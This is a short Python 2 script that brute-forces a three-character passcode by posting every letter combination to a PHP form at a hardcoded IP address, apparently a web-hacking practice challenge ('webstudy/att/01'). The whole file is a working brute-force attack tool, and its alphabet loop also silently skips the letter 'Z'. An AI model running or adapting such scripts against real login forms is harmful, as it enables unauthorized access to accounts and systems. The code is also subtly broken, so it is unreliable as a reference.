from itertools import product
import requests

dic= ''


for char in range(65,90) :
        dic += chr(char)

for char in range(97,123) :
        dic += chr(char)
'''
for num in range(0,10) :
        dic += str(num)
'''
length=3
passcode=''


for i in range(3,length+1):
        diclist = product(dic,repeat=i)
        for j in diclist :
                passcode = ''.join(j)
                url = "http://203.229.206.22/~wing608/webstudy/att/01/b80fa55b1234f1935cea559d9efbc39a.php"
                data = {"num":passcode,"submit":"submit"}
                res = requests.post(url,data=data)
                
                if res.text != "FAIL\n" :
                        print res.text
                        break
                else :
                        print passcode
                
            